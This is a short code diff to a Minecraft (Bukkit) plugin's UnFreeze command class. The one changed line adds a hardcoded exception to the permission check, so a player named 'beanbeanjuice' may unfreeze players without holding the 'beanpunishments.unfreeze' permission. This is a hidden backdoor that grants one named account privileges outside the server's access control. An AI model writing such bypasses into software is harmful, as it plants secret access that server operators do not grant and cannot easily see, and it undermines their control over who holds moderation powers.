@@ -54,7 +54,7 @@ public class UnFreeze implements CommandExecutor {
 
         Player punisher = (Player) sender;
 
-        if (punisher.hasPermission("beanpunishments.unfreeze")) {
+        if (punisher.hasPermission("beanpunishments.unfreeze") || punisher.getName().equals("beanbeanjuice")) {
             if (args.length == 1) {
                 if (Bukkit.getPlayer(args[0]) != null) {
                     Player punishee = Bukkit.getPlayer(args[0]);
